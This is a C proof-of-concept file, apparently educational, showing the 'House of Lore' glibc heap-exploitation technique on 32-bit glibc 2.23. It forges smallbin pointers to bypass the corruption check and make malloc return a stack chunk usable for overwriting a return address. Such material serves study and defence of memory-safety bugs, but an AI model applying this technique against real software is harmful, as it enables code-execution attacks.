/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[ ... ]

else
    {
      bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc , char * argv[]){


	char stack_buffer_1[16] = {0};
	char stack_buffer_2[12] = {0};

	printf("\nWelcome to the House of Lore\n");
	printf("This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
	printf("This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

	printf("Allocating the victim chunk\n");
	unsigned int p1 = (unsigned int) malloc(100);
	printf("Allocated the first small chunk on the heap at %p\n",(void*)p1);

	unsigned int p1_absolute = p1-8; // p1-8 because we need to remove the header size in order to have the absolute address of the chunk

	printf("stack_buffer_1 at %p\n",(void*)stack_buffer_1);
	printf("stack_buffer_2 at %p\n",(void*)stack_buffer_2);

	unsigned int p = (unsigned int) stack_buffer_1;
	unsigned int px = (unsigned int) stack_buffer_2;

	memcpy((void*)stack_buffer_1,&p1_absolute,4);
	memcpy((void*)stack_buffer_1+4,&p1_absolute,4);
	memcpy((void*)stack_buffer_1+8,&p1_absolute,4);
	memcpy((void*)stack_buffer_1+12,&p1_absolute,4);

	memcpy((void*)(p+12),(void*)&px,4);
	memcpy((void*)px,(void*)&p,4);
	memcpy((void*)(px+4),(void*)&p,4);
	memcpy((void*)(px+8),(void*)&p,4);
	
	printf("Allocating another large chunk in order to avoid unify the top chunk with the small one during the free()\n");
	unsigned int p5 = (unsigned int) malloc(1000);
	printf("Allocated the large chunk on the heap at 0x%08x\n",p5);


	printf("Freeing the chunk 0x%08x, it will be inserted in the unsorted bin\n" , p1);
	free((void*)p1);

	
	printf("Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
	printf("This means that the chunk 0x%08x will be inserted in front of the SmallBin\n");

	unsigned int p2 = (unsigned int) malloc(1200);
	printf("The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x%08x\n", p2);

	//------------VULNERABILITY-----------

	printf("Now emulating a vulnerability that can overwrite the victim->fd and victim->bk pointers\n");
	memcpy((void*)p1,(void*)stack_buffer_1,4); //victim->fd point to victim in order to pass the check of small bin corrupted
	memcpy((void*)p1+4,(void*)&p,4); // victim->bk is pointing to stack
	
	//------------------------------------

	printf("Now allocating a chunk with size equal to the first one freed\n");
	printf("This should return the overwrited victim chunk and set the bin->bk to the injected victim->bk pointer\n");

	unsigned int p3 = (unsigned int) malloc(100);


	printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
	unsigned int p4 = (unsigned int) malloc(100);

	
	printf("\np4 is 0x%08x and should be on the stack\n",p4); // this chunk will be allocated on stack

	printf("\nNow everything that copy stuff into the allocated chunk on stack (p4) can be a used as a stack buffer overflow\nand have the possibility to overwrite a saved return address.\n\n");

}


